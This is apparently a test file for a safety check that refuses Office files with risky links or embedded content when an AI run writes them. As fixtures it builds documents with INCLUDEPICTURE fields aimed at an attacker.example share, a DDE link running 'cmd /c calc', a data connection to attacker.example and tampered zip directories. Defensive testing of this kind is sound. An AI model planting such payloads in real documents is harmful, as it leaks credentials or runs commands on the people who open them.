// The Office safety check where a file a run built leaves it (files/office-exit.ts, docs/decisions/20261124-doc-skills.md):
// a Word, PowerPoint or Excel file with a file: or \\host\share link, an embedded object or a field that runs something is
// refused, unless the file it was made from already held that same item (a company template keeps working). A run that
// writes such a file straight into a project folder or the person's own folder gets it undone (devenv/track.ts).
import { afterAll, beforeAll, beforeEach, describe, expect, setDefaultTimeout, test } from 'bun:test'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { API, DEV_ENV_DEFAULT_LIMITS, uuidv7, type ProjectParticipant } from '@mycel/shared/api'
import { startHarness, type Harness, type TestSocket } from '../lib/b-harness'
import { _active, setSrtSystem } from '../../server/src/devenv/srt/runner'
import type { SpawnSpec, SrtSystem, UnitInfo } from '../../server/src/devenv/srt/system'
import type { DevEnvPlan } from '../../server/src/devenv/srt/plan'
import { newConsent, saveTeamSetting, teamSetting } from '../../server/src/devenv/setting'
import { boxShellTool, callerOf } from '../../server/src/devenv/tool'
import { settleRunWrites } from '../../server/src/devenv/track'
import { componentC } from '../../server/src/team-files/component'
import { officeExitRequest } from '../../server/src/files/office-links-check'
import { assertSafeTeamFile, bytesReader, contentKind, officeKind } from '../../server/src/files/office-exit'
import { writeZip } from '../../server/src/files/zip-write'
import { docx, UNC } from '../lib/office-fixture'

setDefaultTimeout(120_000)
const enc = new TextEncoder()
function frame(kind: string, file: Uint8Array, earlier: Uint8Array[] = []): Uint8Array {
  const head = enc.encode(JSON.stringify({ kind, sizes: [file.length, ...earlier.map((e) => e.length)] }))
  const out = new Uint8Array(4 + head.length + file.length + earlier.reduce((n, e) => n + e.length, 0))
  new DataView(out.buffer).setUint32(0, head.length); out.set(head, 4)
  let at = 4 + head.length
  for (const p of [file, ...earlier]) { out.set(p, at); at += p.length }
  return out
}

describe('the exit check', () => {
  test('kinds by name, macro-enabled ones included', () => {
    expect(officeKind('a.DOCX')).toBe('docx'); expect(officeKind('b.xlsm')).toBe('xlsx'); expect(officeKind('c.potx')).toBe('pptx'); expect(officeKind('d.pdf')).toBeNull()
  })
  test('a new \\\\host\\share or file: link is refused; a web link passes', () => {
    expect(() => officeExitRequest(frame('docx', docx({ link: UNC })))).toThrow(/files\.example/)
    expect(() => officeExitRequest(frame('docx', docx({ link: 'file:///etc/passwd' })))).toThrow(/file:/)
    expect(officeExitRequest(frame('docx', docx({ link: 'https://example.com' })))).toBeInstanceOf(Uint8Array)
  })
  test('an edit keeps an item the earlier version already held, and only that one', () => {
    const template = docx({ link: UNC, body: 'Template' })
    expect(officeExitRequest(frame('docx', docx({ link: UNC, body: 'Filled in' }), [template]))).toBeInstanceOf(Uint8Array)
    expect(() => officeExitRequest(frame('docx', docx({ link: 'file:///tmp/other', body: 'Filled in' }), [template]))).toThrow(/file:/)
  })
  test('a damaged file is refused, also with an earlier version', () => {
    expect(() => officeExitRequest(frame('docx', enc.encode('not a zip'), [docx()]))).toThrow()
  })
  test('through the office worker, as every exit calls it; decided by content, not by name', async () => {
    await expect(assertSafeTeamFile('report.docx', docx({ link: UNC }), null)).rejects.toThrow(/files\.example/)
    // the same Word file under another name is still checked
    await expect(assertSafeTeamFile('notes.txt', docx({ link: UNC }), null)).rejects.toThrow(/files\.example/)
    expect((await assertSafeTeamFile('report.docx', docx(), null)).length).toBeGreaterThan(0)
    const pdf = enc.encode('%PDF-1.7')
    expect(await assertSafeTeamFile('a.pdf', pdf, null)).toBe(pdf)
  })
  test('an OLE2 file is Office only by its streams: a Word document is opaque, an Outlook message is not', () => {
    const cfb = (stream: string) => {
      // one 512-byte header, a FAT sector (0), a directory sector (1)
      const b = new Uint8Array(512 * 3); const v = new DataView(b.buffer)
      b.set([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]); v.setUint16(0x1e, 9, true); v.setUint32(0x2c, 1, true); v.setUint32(0x30, 1, true); v.setUint32(0x44, 0xfffffffe, true)
      v.setUint32(0x4c, 0, true); for (let i = 1; i < 109; i++) v.setUint32(0x4c + i * 4, 0xffffffff, true)
      const fat = 512; v.setUint32(fat, 0xfffffffd, true); v.setUint32(fat + 4, 0xfffffffe, true); for (let i = 2; i < 128; i++) v.setUint32(fat + i * 4, 0xffffffff, true)
      const put = (o: number, name: string, type: number) => { const n = Buffer.from(name + '\0', 'utf16le'); b.set(n, 1024 + o); v.setUint16(1024 + o + 0x40, n.length, true); b[1024 + o + 0x42] = type }
      put(0, 'Root Entry', 5); put(128, stream, 2)
      return b
    }
    const doc = cfb('WordDocument'), msg = cfb('__substg1.0_0037001F')
    expect(contentKind('a.doc', doc.length, bytesReader(doc))).toMatchObject({ opaque: expect.stringMatching(/legacy Office/) })
    expect(contentKind('mail.msg', msg.length, bytesReader(msg))).toBeNull()
    const broken = doc.slice(0, 600)
    expect(contentKind('a.doc', broken.length, bytesReader(broken))).toMatchObject({ opaque: expect.stringMatching(/could not be listed/) })
  })
  test('formats that cannot be read inside pass only as the replaced file\'s own bytes; shortcuts never', async () => {
    const ole = new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1, 1, 2, 3])
    await expect(assertSafeTeamFile('a.doc', ole, null)).rejects.toThrow(/could not be listed/)
    expect(await assertSafeTeamFile('a.doc', ole, ole)).toBe(ole)
    await expect(assertSafeTeamFile('a.txt', enc.encode('{\\rtf1 {\\field{\\*\\fldinst INCLUDEPICTURE "\\\\\\\\h\\\\s"}}}'), null)).rejects.toThrow(/RTF/)
    await expect(assertSafeTeamFile('a.mht', enc.encode('MIME-Version: 1.0\r\nContent-Type: multipart/related; boundary=x\r\n'), null)).rejects.toThrow(/MHT/)
    for (const n of ['a.url', 'b.library-ms', 'c.searchConnector-ms', 'd.scf']) await expect(assertSafeTeamFile(n, enc.encode('x'), null)).rejects.toThrow(/outside the team folder/)
    await expect(assertSafeTeamFile('ok.txt', enc.encode('[InternetShortcut]\r\nURL=file://h/s\r\n'), null)).rejects.toThrow(/shortcut/)
    expect(contentKind('a.txt', 5, bytesReader(enc.encode('hello')))).toBeNull()
    // a Hangul .hwpx (mimetype + manifest, no [Content_Types].xml) is not Office and not OpenDocument
    const hwpx = writeZip([{ name: 'mimetype', data: enc.encode('application/hwp+zip'), store: true }, { name: 'META-INF/manifest.xml', data: enc.encode('<m/>') }, { name: 'Contents/section0.xml', data: enc.encode('<s/>') }])
    expect(contentKind('a.hwpx', hwpx.length, bytesReader(hwpx))).toBeNull()
    const odt = writeZip([{ name: 'mimetype', data: enc.encode('application/vnd.oasis.opendocument.text'), store: true }, { name: 'content.xml', data: enc.encode('<c/>') }])
    expect(contentKind('a.odt', odt.length, bytesReader(odt))).toMatchObject({ opaque: expect.stringMatching(/OpenDocument/) })
  })
})

// ---------------- the security review's repros (2026-11-24): each must be refused now ----------------
const RELS = 'http://schemas.openxmlformats.org/package/2006/relationships'
const OD = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships'
const CT = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/></Types>'
function word(body: string, rels = ''): Uint8Array {
  return writeZip([
    { name: '[Content_Types].xml', data: enc.encode(CT) },
    { name: '_rels/.rels', data: enc.encode(`<Relationships xmlns="${RELS}"><Relationship Id="rId1" Type="${OD}/officeDocument" Target="word/document.xml"/></Relationships>`) },
    { name: 'word/document.xml', data: enc.encode(`<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office"><w:body>${body}</w:body></w:document>`) },
    { name: 'word/_rels/document.xml.rels', data: enc.encode(`<Relationships xmlns="${RELS}">${rels}</Relationships>`) },
  ])
}
const fld = (code: string) => `<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve">${code}</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`
const ole = (id: string, t = 'embeddings/oleObject1.bin') => `<Relationship Id="${id}" Type="${OD}/oleObject" Target="${t}"/>`
describe('the second review\'s repros: what a package is comes from its parts, read in full', () => {
  const body = `<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>${'<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve">INCLUDEPICTURE "\\\\\\\\attacker.example\\\\x\\\\a.png" \\d</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'}</w:body></w:document>`
  test('E: a Word main part outside word/ is still scanned for its fields', async () => {
    const d = writeZip([
      { name: '[Content_Types].xml', data: enc.encode(CT) },
      { name: '_rels/.rels', data: enc.encode(`<Relationships xmlns="${RELS}"><Relationship Id="rId1" Type="${OD}/officeDocument" Target="a/main.xml"/></Relationships>`) },
      { name: 'a/main.xml', data: enc.encode(body) },
    ])
    expect(contentKind('r.docx', d.length, bytesReader(d))).toMatchObject({ office: expect.any(String) })
    expect(() => officeExitRequest(frame('pptx', d))).toThrow(/INCLUDEPICTURE/i)
    await expect(assertSafeTeamFile('r.docx', d, null)).rejects.toThrow(/INCLUDEPICTURE/i)
  })
  test('G: an entry count lowered to hide the last directory entry is refused; H: an end record hidden in the comment too', async () => {
    const evil = () => writeZip([
      { name: 'a.txt', data: enc.encode('x') },
      { name: '_rels/.rels', data: enc.encode(`<Relationships xmlns="${RELS}"><Relationship Id="rId1" Type="${OD}/officeDocument" Target="word/document.xml"/></Relationships>`) },
      { name: 'word/document.xml', data: enc.encode(body) },
      { name: '[Content_Types].xml', data: enc.encode(CT) },
    ])
    const eocdAt = (b: Uint8Array) => { for (let i = b.length - 22; i >= 0; i--) if (b[i] === 0x50 && b[i + 1] === 0x4b && b[i + 2] === 5 && b[i + 3] === 6) return i; return -1 }
    const g = new Uint8Array(evil()); const e = eocdAt(g); const v = new DataView(g.buffer)
    v.setUint16(e + 8, v.getUint16(e + 8, true) - 1, true); v.setUint16(e + 10, v.getUint16(e + 10, true) - 1, true)
    expect(contentKind('r.docx', g.length, bytesReader(g))).toMatchObject({ opaque: expect.stringMatching(/could not be listed/) })
    await expect(assertSafeTeamFile('r.docx', g, null)).rejects.toThrow()
    const b0 = evil(); const e0 = eocdAt(b0); const rv = new DataView(b0.buffer, b0.byteOffset)
    const cdOff = rv.getUint32(e0 + 16, true)
    const first = 46 + rv.getUint16(cdOff + 28, true) + rv.getUint16(cdOff + 30, true) + rv.getUint16(cdOff + 32, true)
    const fake = new Uint8Array(22); const fv = new DataView(fake.buffer)
    fv.setUint32(0, 0x06054b50, true); fv.setUint16(8, 1, true); fv.setUint16(10, 1, true); fv.setUint32(12, first, true); fv.setUint32(16, cdOff, true)
    const h = new Uint8Array(b0.length + 22); h.set(b0); new DataView(h.buffer).setUint16(e0 + 20, 22, true); h.set(fake, b0.length)
    expect(contentKind('r.docx', h.length, bytesReader(h))).toMatchObject({ opaque: expect.stringMatching(/could not be listed/) })
  })
  test('F: a directory larger than any tail, and bytes before the zip, still list every part', async () => {
    const pad = Array.from({ length: 50000 }, (_, i) => ({ name: `customXml/p${String(i).padStart(6, '0')}${'x'.repeat(60)}.bin`, data: new Uint8Array(0) }))
    const d = writeZip([
      { name: '[Content_Types].xml', data: enc.encode(CT) },
      { name: '_rels/.rels', data: enc.encode(`<Relationships xmlns="${RELS}"><Relationship Id="rId1" Type="${OD}/officeDocument" Target="word/document.xml"/></Relationships>`) },
      { name: 'word/document.xml', data: enc.encode(body) },
      ...pad,
    ])
    expect(contentKind('r.docx', d.length, bytesReader(d))).toMatchObject({ office: 'docx' })
    await expect(assertSafeTeamFile('r.bin', d, null)).rejects.toThrow()
    // junk before the zip: still a zip, still checked
    const junk = new Uint8Array([...enc.encode('#!junk before the zip\n'), ...docx({ link: UNC })])
    expect(contentKind('r.dat', junk.length, bytesReader(junk))).toMatchObject({ office: 'docx' })
    // a zip whose directory cannot be read in full is refused, never passed
    const broken = docx({ link: UNC }).slice(); const dv = new DataView(broken.buffer); const eocd = broken.length - 22; dv.setUint16(eocd + 10, 9, true); dv.setUint16(eocd + 8, 9, true)
    expect(contentKind('r.docx', broken.length, bytesReader(broken))).toMatchObject({ opaque: expect.stringMatching(/could not be listed/) })
    await expect(assertSafeTeamFile('r.docx', broken, null)).rejects.toThrow(/could not be listed/)
  })
})

describe('items are vouched for one by one, by exactly what they are', () => {
  test('A: one intranet INCLUDEPICTURE in the template does not vouch for a new one', () => {
    const orig = word(fld('INCLUDEPICTURE "\\\\\\\\intranet\\\\logo.png" \\d'))
    const evil = word(fld('INCLUDEPICTURE "\\\\\\\\intranet\\\\logo.png" \\d') + fld('INCLUDEPICTURE "\\\\\\\\attacker.example\\\\x\\\\a.png" \\d'))
    expect(() => officeExitRequest(frame('docx', evil, [orig]))).toThrow(/INCLUDEPICTURE/i)
    expect(officeExitRequest(frame('docx', orig, [orig]))).toBeInstanceOf(Uint8Array)
  })
  test('B: one embedded object does not vouch for new ones', () => {
    const orig = word('<w:p/>', ole('rId5'))
    expect(() => officeExitRequest(frame('docx', word('<w:p/>', ole('rId5') + ole('rId6', 'embeddings/oleObject2.bin')), [orig]))).toThrow(/embedded object/)
    expect(() => officeExitRequest(frame('docx', word('<w:p/>', ole('rId5') + `<Relationship Id="rId7" Type="${OD}/package" Target="embeddings/evil.bin"/>`), [orig]))).toThrow(/embedded object/)
    expect(officeExitRequest(frame('docx', word('<w:p/>', ole('rId5')), [orig]))).toBeInstanceOf(Uint8Array)
  })
  test('C: Excel DDE external links and data connections are refused', () => {
    const book = (extra: { name: string; data: Uint8Array }[], rels = '') => writeZip([
      { name: '[Content_Types].xml', data: enc.encode(CT) },
      { name: '_rels/.rels', data: enc.encode(`<Relationships xmlns="${RELS}"><Relationship Id="rId1" Type="${OD}/officeDocument" Target="xl/workbook.xml"/></Relationships>`) },
      { name: 'xl/workbook.xml', data: enc.encode('<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"/>') },
      { name: 'xl/_rels/workbook.xml.rels', data: enc.encode(`<Relationships xmlns="${RELS}">${rels}</Relationships>`) },
      ...extra,
    ])
    const dde = book([{ name: 'xl/externalLinks/externalLink1.xml', data: enc.encode('<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><ddeLink ddeService="cmd" ddeTopic="/c calc"/></externalLink>') }], `<Relationship Id="rId3" Type="${OD}/externalLink" Target="externalLinks/externalLink1.xml"/>`)
    expect(() => officeExitRequest(frame('xlsx', dde))).toThrow(/DDE/)
    const conn = book([{ name: 'xl/connections.xml', data: enc.encode('<connections xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><connection id="1" name="q" type="4" refreshOnLoad="1" odcFile="\\\\attacker.example\\s\\q.odc"><webPr url="http://attacker.example/q"/></connection></connections>') }])
    expect(() => officeExitRequest(frame('xlsx', conn))).toThrow(/data connection/)
  })
  test('VML pictures and fills that point at a share are refused', () => {
    const v = word('<w:p><w:r><w:pict><v:shape><v:imagedata src="\\\\attacker.example\\s\\a.png" o:title=""/><v:fill o:href="file:///etc/x"/></v:shape></w:pict></w:r></w:p>')
    expect(() => officeExitRequest(frame('docx', v))).toThrow(/attacker\.example|file:/)
  })
  test('D: what a file is comes from its content, not its name', () => {
    expect(contentKind('a.doc', 8, bytesReader(new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1])))).toMatchObject({ opaque: expect.any(String) })
    const d = docx(); expect(contentKind('a.txt', d.length, bytesReader(d))).toMatchObject({ office: 'docx' })
    for (const n of ['a.url', 'a.library-ms']) expect(contentKind(n, 1, bytesReader(enc.encode('x')))).toMatchObject({ shortcut: expect.any(String) })
  })
})

// ---------------- a run that writes straight into a team folder ----------------
const PLAN: DevEnvPlan = { format: 1, plan: 'team', maxRunning: 3, cpus: 1, memoryMiB: 1024, pids: 256, diskGiB: 4, network: 'open' }
const fake: SrtSystem = {
  spawn(spec: SpawnSpec) {
    const p = Bun.spawn(['bash', '-c', spec.command], { cwd: spec.cwd, env: { ...spec.env, PATH: '/usr/bin:/bin:/usr/sbin:/sbin' }, stdout: 'pipe', stderr: 'pipe' })
    const exited = (async () => {
      const [o, e, code] = await Promise.all([new Response(p.stdout).text(), new Response(p.stderr).text(), p.exited])
      fs.writeFileSync(spec.stdoutFile, o); fs.writeFileSync(spec.stderrFile, e); fs.writeFileSync(spec.exitFile, `${code}\n`)
      return { code, signal: null }
    })()
    return { pid: p.pid, exited }
  },
  async stop() {},
  async unit(): Promise<UnitInfo> { return { state: '', result: '', memoryBytes: null } },
  async units() { return [] as string[] },
  async forget() {},
  oomKills() { return 0 }, cpuUsec() { return 0 }, procs() { return [] }, async selfTest() { return '' },
}
let h: Harness, base = '', team = '', stage = ''
const ws: Record<string, TestSocket> = {}
let P: { id: string; folderPath: string; name: string }
let projectChat = '', ownChat = ''
const abs = (rel: string) => path.join(team, ...rel.split('/'))
const out = (r: { content: { type: string; text?: string }[] }) => r.content.map((c) => c.text ?? '').join('\n')
function shell(o: { project?: boolean } = {}) {
  const tool = boxShellTool({ ctx: h.ctx, project: o.project ? P : null, userId: 'alice', turnId: uuidv7(), chatId: o.project ? projectChat : ownChat, signal: new AbortController().signal, redact: (s) => s,
    confirm: async () => 'run', caller: (f) => callerOf(f, {}) })
  return (command: string) => tool.call({ command, timeout_sec: 120 })
}

beforeAll(async () => {
  process.env.MYCEL_DEV_ENV = '1'
  h = await startHarness({ name: 'office-exit', askUserTimeoutMs: 4000, stallTimeoutMs: 60_000 })
  for (const u of ['alice']) { ws[u] = await h.ws(u); await ws[u]!.next('hello') }
  base = fs.mkdtempSync(path.join(os.tmpdir(), 'oex-'))
  stage = fs.mkdtempSync(path.join(os.tmpdir(), 'oex-in-'))
  team = h.ctx.files.fx.root
  setSrtSystem(fake, { base, id: 'mycel', plan: PLAN })
  const user = (id: string): ProjectParticipant => ({ subjectType: 'user', subjectId: id })
  const p = await h.api('dana').call(API.createProject, { body: { name: 'Office Exit', participants: [user('alice')], instructions: '' } })
  P = { id: p.id, folderPath: p.folderPath, name: p.name }
  projectChat = (await h.api('alice').call(API.createChat, { body: { projectId: P.id } })).id
  ownChat = (await h.api('alice').call(API.createChat, { body: {} })).id
})
afterAll(async () => { for (const s of Object.values(ws)) s.close(); setSrtSystem(null); delete process.env.MYCEL_DEV_ENV; await h.close(); fs.rmSync(base, { recursive: true, force: true }); fs.rmSync(stage, { recursive: true, force: true }) })
beforeEach(() => {
  _active().clear()
  setSrtSystem(fake, { base, id: 'mycel', plan: PLAN })
  h.ctx.db.query('DELETE FROM dev_env_runs').run()
  saveTeamSetting(h.ctx.db, { ...teamSetting(h.ctx.db), enabled: true, scope: { mode: 'writers', groupIds: [], userIds: [] }, network: 'open', limits: DEV_ENV_DEFAULT_LIMITS, extraDomains: [], consent: newConsent({ id: 'dana', name: 'Dana' }) })
})
const put = (name: string, b: Uint8Array) => { const f = path.join(stage, name); fs.writeFileSync(f, b); return f }

describe('a run writes an Office file straight into a team folder', () => {
  test('a project run makes a Word file with a share link: it is not kept, and the AI is told', async () => {
    await shell({ project: true })('true') // the project's baseline
    const bad = put('bad.docx', docx({ link: UNC }))
    const r = await shell({ project: true })(`cp "${bad}" report.docx`)
    expect(fs.existsSync(abs(`${P.folderPath}/report.docx`))).toBe(false)
    expect(out(r)).toContain('Office safety check refused')
    expect(out(r)).toContain('report.docx')
  })
  test('a project run edits a template that already had the link: kept; adding a new risky link puts the template back', async () => {
    const rel = `${P.folderPath}/template.docx`
    // the company's template, uploaded on the Files screen between two commands: its own link is the company's
    await h.api('alice').call(API.upload, { body: { fields: { folder: P.folderPath, name: 'template.docx', onExists: 'replace' }, file: new Blob([Buffer.from(docx({ link: UNC, body: 'Template' }))]) } } as never)
    expect(fs.existsSync(abs(rel))).toBe(true)
    await shell({ project: true })('true')
    const ok = put('ok.docx', docx({ link: UNC, body: 'Filled' }))
    await shell({ project: true })(`cp "${ok}" template.docx`)
    expect(fs.readFileSync(abs(rel))).toEqual(Buffer.from(docx({ link: UNC, body: 'Filled' })))
    const worse = put('worse.docx', docx({ link: 'file:///etc/shadow', body: 'Filled' }))
    const r = await shell({ project: true })(`cp "${worse}" template.docx`)
    expect(out(r)).toContain('the version before is back')
    expect(fs.readFileSync(abs(rel))).toEqual(Buffer.from(docx({ link: UNC, body: 'Filled' })))
  })
  test('a file a job wrote between two commands is checked at the next one', async () => {
    await shell({ project: true })('true')
    fs.writeFileSync(abs(`${P.folderPath}/by-job.docx`), docx({ link: UNC }))
    const r = await shell({ project: true })('true')
    expect(fs.existsSync(abs(`${P.folderPath}/by-job.docx`))).toBe(false)
    expect(out(r)).toContain('by-job.docx')
  })
  test('a run in the person\'s own chat writes into her own folder: refused the same way', async () => {
    fs.mkdirSync(abs('users/alice'), { recursive: true })
    await shell()('true')
    const bad = put('own.docx', docx({ link: UNC }))
    const r = await shell()(`cp "${bad}" "$TRINA_TEAM/users/alice/own.docx"`)
    expect(fs.existsSync(abs('users/alice/own.docx'))).toBe(false)
    expect(out(r)).toContain('Office safety check refused')
  })
  test('a job or dev server writes between commands: checked when it is settled (its end, the tracker poll)', async () => {
    await shell({ project: true })('true')
    fs.writeFileSync(abs(`${P.folderPath}/job-out.docx`), docx({ link: UNC }))
    const blocked = await settleRunWrites(h.ctx, { userId: 'alice', projectId: P.id })
    expect(blocked.map((b) => b.path)).toEqual([`${P.folderPath}/job-out.docx`])
    expect(fs.existsSync(abs(`${P.folderPath}/job-out.docx`))).toBe(false)
  })
  test('a person\'s own save is never undone, even with a risky link', async () => {
    await shell({ project: true })('true')
    await h.api('alice').call(API.upload, { body: { fields: { folder: P.folderPath, name: 'mine.docx', onExists: 'replace' }, file: new Blob([Buffer.from(docx({ link: UNC, body: 'Mine' }))]) } } as never)
    const blocked = await settleRunWrites(h.ctx, { userId: 'alice', projectId: P.id })
    expect(blocked).toEqual([])
    expect(fs.existsSync(abs(`${P.folderPath}/mine.docx`))).toBe(true)
  })
  test('a job in the person\'s own chat writes into her own folder: checked when it is settled', async () => {
    fs.mkdirSync(abs('users/alice'), { recursive: true })
    await shell()('true')
    fs.writeFileSync(abs('users/alice/by-job.docx'), docx({ link: UNC }))
    const blocked = await settleRunWrites(h.ctx, { userId: 'alice', projectId: null })
    expect(blocked.map((b) => b.path)).toEqual(['users/alice/by-job.docx'])
  })
})

describe('files this answer read vouch only in the bytes it read', () => {
  test('a file changed on disk after the read vouches for nothing', async () => {
    const { readVouchers } = await import('../../server/src/files/office-exit')
    const crypto = await import('node:crypto')
    const rel = `${P.folderPath}/read-then-changed.docx`
    const v1 = docx({ link: UNC, body: 'v1' })
    fs.writeFileSync(abs(rel), v1)
    const readHash = crypto.createHash('sha256').update(v1).digest('hex')
    expect(readVouchers(team, [[rel, readHash]]).length).toBe(1)
    fs.writeFileSync(abs(rel), docx({ link: 'file:///etc/shadow', body: 'v2' }))
    expect(readVouchers(team, [[rel, readHash]])).toEqual([])
    // and a changed item is not vouched by the original either
    expect(() => officeExitRequest(frame('docx', docx({ link: 'file:///etc/shadow' }), [v1]))).toThrow(/file:/)
  })
})

describe('copies and renames by the AI', () => {
  test('a copy inside the team folder is checked; the same file copied by a person on the Files screen is not', async () => {
    const src = `${P.folderPath}/src.docx`
    await h.api('alice').call(API.upload, { body: { fields: { folder: P.folderPath, name: 'src.docx', onExists: 'replace' }, file: new Blob([Buffer.from(docx({ link: UNC }))]) } } as never)
    const svc = componentC(h.ctx).files
    await expect(svc.copy('alice', src, `${P.folderPath}/ai-copy.docx`, { turnId: uuidv7(), tool: 'copy_files' })).rejects.toThrow(/files\.example/)
    expect(fs.existsSync(abs(`${P.folderPath}/ai-copy.docx`))).toBe(false)
    await svc.copy('alice', src, `${P.folderPath}/person-copy.docx`, {})
    expect(fs.existsSync(abs(`${P.folderPath}/person-copy.docx`))).toBe(true)
  })
  test('renaming a file so it opens as an Office file or a shortcut is refused', async () => {
    const { renameProblem } = await import('../../server/src/files/office-exit')
    fs.writeFileSync(abs(`${P.folderPath}/payload.bin`), docx({ link: UNC }))
    expect(renameProblem('payload.bin', 'payload.docx', abs(`${P.folderPath}/payload.bin`))).toMatch(/not checked under this name/)
    expect(renameProblem('a.txt', 'a.url', abs(`${P.folderPath}/payload.bin`))).toMatch(/outside the team folder/)
    fs.writeFileSync(abs(`${P.folderPath}/plain.docx`), docx())
    expect(renameProblem('plain.docx', 'plain2.docx', abs(`${P.folderPath}/plain.docx`))).toBeNull()
  })
})
